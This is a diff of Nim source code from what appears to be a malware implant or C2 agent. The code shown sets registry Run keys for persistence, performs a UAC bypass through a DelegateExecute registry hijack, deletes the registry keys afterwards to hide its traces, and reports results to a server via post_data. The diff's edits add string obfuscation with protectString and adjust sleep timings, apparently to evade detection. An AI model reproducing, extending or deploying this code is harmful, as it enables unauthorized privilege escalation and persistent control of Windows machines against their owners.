@@ -476,7 +476,7 @@ proc set_run_key(key_name: string, cmd: string): bool =
     for hive in [protectString("HKLM"), protectString("HKCU")]:
         if regWrite(hive & run_path, key_name, cmd):
             is_success = true  
-            added_path = hive & run_path & " -> " & key_name
+            added_path = hive & run_path & protectString(" -> ") & key_name
             break
     
     var data = {
@@ -529,7 +529,7 @@ proc uac_bypass(bypass_method: string, cmd: string): bool =
     if regWrite(reg_path, "", cmd) and regWrite(reg_path, protectString("DelegateExecute"), ""):
         sleep(1000)
         if execCmdEx(launch, options={poDaemon}).exitCode == 0:
-            sleep(2000)
+            sleep(5000)
             if is_elevated_mutex_enabled():
                 is_success = true
             else:
@@ -542,7 +542,7 @@ proc uac_bypass(bypass_method: string, cmd: string): bool =
     
     is_success_post = post_data(client, protectString("uac-") & bypass_method , $data)
 
-    sleep(2000)
+    sleep(1000)
     regDelete(reg_path, "")
     regDelete(reg_path, protectString("DelegateExecute"))
 
